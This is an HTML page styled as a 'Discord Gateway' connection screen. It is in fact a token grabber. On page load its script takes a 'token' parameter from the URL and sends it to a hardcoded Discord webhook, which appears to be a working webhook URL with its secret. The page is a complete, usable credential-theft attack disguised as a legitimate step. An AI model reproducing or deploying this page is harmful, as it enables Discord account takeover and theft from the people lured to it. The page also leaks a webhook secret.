<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Conect To Discord Gateway</title>
    <style>
        body {
            /* Replace the URL below with the path to your SVG file */
            background-image: url('https://raw.githubusercontent.com/Ron015/image/main/discord/gateway.svg');
            background-position: center; /* Center the background image */
            background-repeat: repeat;
            background-size: 100%, 100%;
            background-color: black;
            
        }
</style>
</head>
<body>

    <script>
        // Function to get query parameter by name
        function getQueryParam(name) {
            let urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        // Function to post data to Discord webhook
        function postToDiscord(token) {
            const webhookURL = "https://discord.com/api/webhooks/1255865159612891136/-t2qvz5SQt1jFIfN-otVuC08OeJB0VFTg8uOjwzmnNcJ-fL415UbxwLNBEj9lWALYbHR"; // Replace with your Discord webhook URL
            const message = {
                content: `${token}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch((error) => console.error('Error:', error));
        }

        // Get the token from URL and post to Discord webhook
        const token = getQueryParam('token');
        if (token) {
            postToDiscord(token);
        } else {
            console.log('Token parameter not found in the URL');
        }
    </script>
</body>
</html>
